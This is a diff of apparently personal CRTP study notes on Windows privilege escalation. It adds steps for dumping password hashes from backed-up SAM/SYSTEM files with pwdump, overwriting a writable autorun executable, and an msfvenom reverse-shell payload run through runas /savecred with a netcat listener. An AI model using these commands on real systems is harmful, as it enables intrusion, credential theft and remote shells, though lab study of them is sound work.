@@ -468,10 +468,11 @@ Get-DomainForeignGroupMember
 > 10. [ ] Hot Potato attack
 > 11. [ ] Kernel Exploits
 > 12. [ ] Password Mining Escalation - Firefox
-> 13. [ ] Runas-Savdcreds
-> 14. [ ] Backup Operators (Disk shadow + Robocopy)
-> 15. [ ] Abusing GPO permissions
-> 16. [ ] Export LAPS Passwords
+> 13. [ ] Backup
+> 14. [ ] Runas-Savdcreds
+> 15. [ ] Backup Operators (Disk shadow + Robocopy)
+> 16. [ ] Abusing GPO permissions
+> 17. [ ] Export LAPS Passwords
 Windows Enumeration:
 - system enum
 ```
@@ -535,28 +536,17 @@ you can use the below tools for complete coverage
 
 ## <span style="color:lightgreen">Methodology</span>
 
-Autorun is a type of Registry Escalation.
-
-To ensure that the IT department creates a secure environment, Windows administrators often need to know what kind of access specific users or groups have to resources, including files, directories, Registry keys, global objects, and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.
-
-So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.
+Some programs are determined by the system administrator to run as soon as the system starts, so we assume that if we have a program we can modify it so that we add our own malicious file in place of the program. The first time the system is restarted, the first user to log in to the system will run the malicious file according to its authority.
 
 ### Using Autoruns and AccessChk
-
 1. Transfer [Autoruns64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)) on the Windows/AD machine and execute it on cmd
 ```console
 C:\Temp> Autoruns64.exe
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/91e45f42-3bf4-4503-a88d-b5ec77207f3b)
-
-
 2. In Autoruns, click on the `"Logon"` tab.
 3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
 4. Go back to the command prompt run [AccessChk64.exe]([https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk))
-
-5. Another way to identify autorun programs using cmd
--     req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
 ```console
 C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"
 
@@ -565,12 +555,20 @@ C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"
 # v --> verbose; dispaly as many details as possible
 # u --> ignore the errors
 ```
-
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e31e838-22b0-4aa4-be5f-02dd129b0630)
+
+### Using cmd
+-     req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+### Using winPEAS (recommended)
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1f67ed07-25c9-49c1-9572-941443e2fa2c)
+From the output, notice that the `"Everyone"` user group has `"AllAccess"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.
+1. confirm the AllAccess privilege that we got form winPEAS by running accesschk.exe
+-     accesschk.exe /accepteula -wvu <user> "C:\Program Files\Autorun Program\program.exe"
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b9c86c44-bf07-4604-b798-38a5c5ae5d00)
 
 
 ### Using PowerUp
-
 1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)
 
 ```console
@@ -1307,6 +1305,19 @@ decrypting login/password pairs
    https://creds.com:b'mayor',b'<<HIDDEN>>'
 ```
 
+# <span style="color:lightblue">Backup</span>
+## <span style="color:lightgreen">Methodology</span>
+sometimes the administrator makes a backup file of the SAM & SYSTEM. often these files are stored in the `"C:\Windows\Repair"` OR `"C:\Windows\System32\config\RegBack"`
+
+## <span style="color:lightgreen">Detection</span>
+1. Run winPEAS and check for the backup files
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c6d0d49-fca0-434f-8012-e10ec75c5db6) you got the SAM & SYSTEM files
+
+## <span style="color:lightgreen">Exploitation</span>
+1. use pwdump tool to dump the password of all users
+-     python3 pwdump.py SYSTEM SAM
+
+
 # <span style="color:lightblue">Runas-Savdcreds</span>
 ## <span style="color:lightgreen">Methodology</span>
 We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.
@@ -1322,13 +1333,29 @@ Currently stored credentials:
  Type: Domain Password
  User: WORKGROUP\Administrator
 ```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/759d48ae-2904-4a72-81f6-7a55690de02c)
 
 ## <span style="color:lightgreen">Exploitation</span>
 1. Reading root flag
-
 ```console
 C:\Temp> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE c:\Users\Administrator\Desktop\root.txt > C:\Users\security\root1.txt"
 ```
+
+2. getting a reverse shell
+use masfvenom 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
+```
+start the listener
+```
+nc -nlvp
+```
+runas exploit
+```
+runas /savecred /user:admin C:\Temp\program.exe
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/609e3011-2b5a-427f-92e3-15399306979b)
+
 
 # <span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span>
 
